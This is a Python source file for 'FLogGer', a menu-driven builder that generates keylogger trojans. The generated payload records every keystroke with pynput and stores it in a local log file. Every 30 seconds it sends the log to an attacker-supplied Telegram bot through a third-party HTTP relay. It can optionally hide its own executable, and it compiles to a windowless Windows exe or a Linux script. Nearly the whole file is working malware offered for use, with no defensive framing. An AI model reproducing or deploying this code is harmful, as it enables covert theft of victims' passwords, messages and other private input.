from os import system
from colorama import Fore
from time import sleep
from platform import uname
from rich.console import Console
from rich.table import Table

filePath = __file__
filePath = list(filePath)
x = 0
arry = ''
while x < len(filePath):
    if filePath[x] == '\\' :
        filePath[x] = '/'
    x+=1
for i in filePath :
    arry += i
filePath = arry.split('/FLogGer.py')

# Variable
targetInfo = uname()
filePath = filePath[0]+'/'
login = '0'
trojanData = {'token': None, 'chatId': None}
payloadName = 'file'
Red = Fore.RED
White = Fore.WHITE
Green = Fore.GREEN
Yellow = Fore.YELLOW

inputICon = (Green+'=-=>  '+White)

iconName = Green+'''
                        _____ _                 ____           
                        |  ___| |    ___   __ _ / ___| ___ _ __ 
                        | |_  | |   / _ \ / _` | |  _ / _ \ '__|
                        |  _| | |__| (_) | (_| | |_| |  __/ |   
                        |_|   |_____\___/ \__, |\____|\___|_|   
                                           |___/                           
'''

helpMessage = f'''
    {Yellow}╔════════════════════════════════════════════════════════════════════════════════════╗
    {Yellow}║{Green}  -bt     Telgram Bot TOKEN < -bt 1313131313:qwwwet45gdfg3dfhdsdkwsm9mfks9edjdls >  {Yellow}║
    {Yellow}║{Green}  -ci     Telgram Chat Id < -ci 121212121 >                                         {Yellow}║
    {Yellow}║{Green}  -np     Set Payload Name, Don't Enter The File Extension(Default Name : file)     {Yellow}║
    {Yellow}║{Green}  -o      Show option                                                               {Yellow}║
    {Yellow}║{Green}  -s      Start Compile                                                             {Yellow}║
    {Yellow}║{Green}  -h      Help                                                                      {Yellow}║
    {Yellow}║{Green}  -e      Exit                                                                      {Yellow}║
    {Yellow}╚════════════════════════════════════════════════════════════════════════════════════╝
'''+White

compilerMessage = Green+'''
    {Yellow}╔════════════════════════════════════════════════════════════════════════════════════╗
    {Yellow}║{Green}  ?       Help                                                                      {Yellow}║
    {Yellow}║{Green}  1       exe File (windows)                                                        {Yellow}║
    {Yellow}║{Green}  2       sh File (linux)                                                           {Yellow}║
    {Yellow}║{Green}  B       Back                                                                      {Yellow}║
    {Yellow}║{Green}  E       Exit                                                                      {Yellow}║
    {Yellow}╚════════════════════════════════════════════════════════════════════════════════════╝
'''+White

# Def
    
def ToExe():
    system('pip install pyinstaller')
    print(Green+'pyinstaller install'+White)
    system(f'cd {filePath}/ && mkdir payload && cd payload && mkdir tmp && dir')
    print(Green+f'your File Path: {filePath}'+White)
    sleep(1)
    system(f'pyinstaller --onefile -c --distpath {filePath}/payload --workpath {filePath}/payload/tmp {payloadName}.py -w ')
    open(f'{payloadName}.py', 'w')
    print (White+'════════════════════════════════════════════════════════════════════════════════════\nyour payload is in '+Green+f'{filePath}payload/{payloadName}.exe'+' directory\n════════════════════════════════════════════════════════════════════════════════════')


def Compiler():

    token = trojanData['token']
    chatId = trojanData['chatId']
    
    if trojanData['token'] == None or trojanData['chatId'] == None:
        print(White+f'bot token set ==> {token}\nchat Id set ==> {chatId}\n'+Red+'Fields should not be empty\ntry again\n'+White)
        return
    
    
    print(compilerMessage)

    while True:
        workSub = str(input(inputICon))
        if workSub == '':
            workSub = workSub.split()
            workSub.append('0')
        else:
            workSub = workSub.split()
        
        system('cd payload')
        
        if workSub[0] == '1':
            x = input('Hide After Start y/n? ( default y ) ')
            if x == '':
                x = x.split()
                x.append('y')
            else:
                x = x.split()
            
            file = open(f'{payloadName}.py', 'w')
            if x[0] == 'n' or x[0] == 'N':            
                file.write(
                    f"from pynput import keyboard\nimport time\nimport requests\ndef HadnlerHTTP(botMessage):\n    botUrl = (f'https://api.telegram.org/bot{token}/sendmessage?chat_id={chatId}&text={{botMessage}}')\n    myData={{'UrlBox':botUrl,'AgentList':'Google Chrome','VersionsList':'HTTP/1.1','MethodList':'GET'}}\n    http = requests.post('https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx',data=myData)\ntry:\n    f = open('keyLogger.txt', 'x')\n    f.close()\nexcept:\n    pass\ntimeSend,startTime = time.time(),time.time()\ndef HandlerRemove(inputKey, value):\n    inputKey = str(inputKey)\n    log = inputKey.split(value)\n    if log[0] == '':\n        log = str(log[1])\n    else:\n        log = str(log[0])\n        log = f' *{{log}}* '\n    return log\ndef SetKeyboardLog(inputKey):\n    global startTime , timeSend\n    if (timeSend+30) <= time.time():\n        file = open('keyLogger.txt', 'r')\n        filedata = file.read()\n        try:\n            HadnlerHTTP(str(filedata))\n            file.close()\n            file = open('keyLogger.txt', 'w')\n            file.close()\n        except :\n            pass\n        file.close()\n        timeSend = time.time()\n    file = open('keyLogger.txt', 'a')\n    if (startTime + 15) <= time.time():\n        startTime = time.time()\n        writeTime = time.ctime(startTime)\n        tMessage=(f'''\n<<time ==> {{writeTime}}>>\n''')\n        file.write(tMessage)\n    if str(inputKey) == 'Key.space' :\n        inputKey = ' '\n    x = list(str(inputKey))\n    if len(x) == 3 :\n        inputKey = str(x[1])\n    file.write(str(inputKey))\n    file.close\ndef LoggerStarter():\n    with keyboard.Listener(on_press=SetKeyboardLog) as lop:\n        lop.join()\nLoggerStarter()")
            else :
                file.write(
                    f"import os\nfrom pynput import keyboard\nimport time\nimport requests\npakegaName='{payloadName}.exe'\nfilePathh = __file__\nos.system(f'attrib.exe +s +h {{pakegaName}}')\ndef HadnlerHTTP(botMessage):\n    botUrl = (f'https://api.telegram.org/bot{token}/sendmessage?chat_id={chatId}&text={{botMessage}}')\n    myData={{'UrlBox':botUrl,'AgentList':'Google Chrome','VersionsList':'HTTP/1.1','MethodList':'GET'}}\n    http = requests.post('https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx',data=myData)\ntry:\n    f = open('keyLogger.txt', 'x')\n    f.close()\nexcept:\n    pass\ntimeSend,startTime = time.time(),time.time()\ndef HandlerRemove(inputKey, value):\n    inputKey = str(inputKey)\n    log = inputKey.split(value)\n    if log[0] == '':\n        log = str(log[1])\n    else:\n        log = str(log[0])\n        log = f' *{{log}}* '\n    return log\ndef SetKeyboardLog(inputKey):\n    global startTime , timeSend\n    if (timeSend+30) <= time.time():\n        file = open('keyLogger.txt', 'r')\n        filedata = file.read()\n        try:\n            HadnlerHTTP(str(filedata))\n            file.close()\n            file = open('keyLogger.txt', 'w')\n            file.close()\n        except :\n            pass\n        file.close()\n        timeSend = time.time()\n    file = open('keyLogger.txt', 'a')\n    if (startTime + 15) <= time.time():\n        startTime = time.time()\n        writeTime = time.ctime(startTime)\n        tMessage=(f'''\n<<time ==> {{writeTime}}>>\n''')\n        file.write(tMessage)\n    if str(inputKey) == 'Key.space' :\n        inputKey = ' '\n    x = list(str(inputKey))\n    if len(x) == 3 :\n        inputKey = str(x[1])\n    file.write(str(inputKey))\n    file.close\ndef LoggerStarter():\n    with keyboard.Listener(on_press=SetKeyboardLog) as lop:\n        lop.join()\nLoggerStarter()")
                
            file.close()
            ToExe()
            
        elif workSub[0] == '2':
            file = open(f'{payloadName}.sh', 'w')
            file.write(
            f"#!/usr/bin/env python\nfrom pynput import keyboard\nimport time\nimport requests\ndef HadnlerHTTP(botMessage):\n    botUrl = (f'https://api.telegram.org/bot{token}/sendmessage?chat_id={chatId}&text={{botMessage}}')\n    myData={{'UrlBox':botUrl,'AgentList':'Google Chrome','VersionsList':'HTTP/1.1','MethodList':'GET'}}\n    http = requests.post('https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx',data=myData)\ntry:\n    f = open('keyLogger.txt', 'x')\n    f.close()\nexcept:\n    pass\ntimeSend,startTime = time.time(),time.time()\ndef HandlerRemove(inputKey, value):\n    inputKey = str(inputKey)\n    log = inputKey.split(value)\n    if log[0] == '':\n        log = str(log[1])\n    else:\n        log = str(log[0])\n        log = f' *{{log}}* '\n    return log\ndef SetKeyboardLog(inputKey):\n    global startTime , timeSend\n    if (timeSend+30) <= time.time():\n        file = open('keyLogger.txt', 'r')\n        filedata = file.read()\n        try:\n            HadnlerHTTP(str(filedata))\n            file.close()\n            file = open('keyLogger.txt', 'w')\n            file.close()\n        except :\n            pass\n        file.close()\n        timeSend = time.time()\n    file = open('keyLogger.txt', 'a')\n    if (startTime + 15) <= time.time():\n        startTime = time.time()\n        writeTime = time.ctime(startTime)\n        tMessage=(f'''\n<<time ==> {{writeTime}}>>\n''')\n        file.write(tMessage)\n    if str(inputKey) == 'Key.space' :\n        inputKey = ' '\n    x = list(str(inputKey))\n    if len(x) == 3 :\n        inputKey = str(x[1])\n    file.write(str(inputKey))\n    file.close\ndef LoggerStarter():\n    with keyboard.Listener(on_press=SetKeyboardLog) as lop:\n        lop.join()\nLoggerStarter()")
            file.close()
            print (White+'════════════════════════════════════════════════════════════════════════════════════\nyour file is in '+Green+f'{filePath}{payloadName}.sh'+' directory\n════════════════════════════════════════════════════════════════════════════════════')

            
        elif workSub[0] == '?':
            print(compilerMessage)
            
        elif workSub[0] == 'B':
            global login
            login = '0'
            WorkSubmit()
        
        elif workSub[0] == 'E':
            exit()
            
        else :
            print(Red+'commend not found'+White)
            print(compilerMessage)
        
        
def WorkSubmit():
    global login
    if login == '0':
        print(iconName)
        print(helpMessage)
    else : 
        pass
    login = '1'
    workSub = str(input(inputICon))
    
    if workSub == '':
        workSub = workSub.split()
        workSub.append('0')
    else:
        workSub = workSub.split()
        
    if len(workSub)==1 and workSub[0] != '-h' and workSub[0] != '-e' and workSub[0] != '-s' and workSub[0] != '-o':
        print('Usage:\n\t< -options command >')
    else:
        if workSub[0] == '-bt':
            trojanData['token'] = workSub[1]
            print(Fore.WHITE+f'bot token set ==> {workSub[1]}')
            workSub[0] == '0'

        elif workSub[0] == '-ci':
            trojanData['chatId'] = workSub[1]
            print(Fore.WHITE+f'chat Id set ==> {workSub[1]}')
            workSub[0] == '0'

        elif workSub[0] == '-np':
            global payloadName
            payloadName = workSub[1]
            print(Fore.WHITE+f'payload name set ==> {workSub[1]}')
            workSub[0] == '0'
        
        elif workSub[0] == '-o' :
            table = Table(title='Pyload Data')
            rows = [
                [trojanData['token'],trojanData['chatId'],payloadName],
            ]
            columns = [' Bot Token ', ' Chat ID ', ' Payload Name ']

            for column in columns:
                table.add_column(column)

            for row in rows:
                table.add_row(*row, style='bright_green')

            console = Console()
            console.print(table)
            workSub[0] == '0'
            
        elif workSub[0] == '-s':
            Compiler()
            workSub[0] == '0'

        elif workSub[0] == '-h':
            print(helpMessage)
            workSub[0] == '0'

        elif workSub[0] == '-e':
            exit()

        elif workSub[0] == '0':
            pass

        else:
            print(Fore.RED+'commend not found')
            print(helpMessage)

while True:
    WorkSubmit()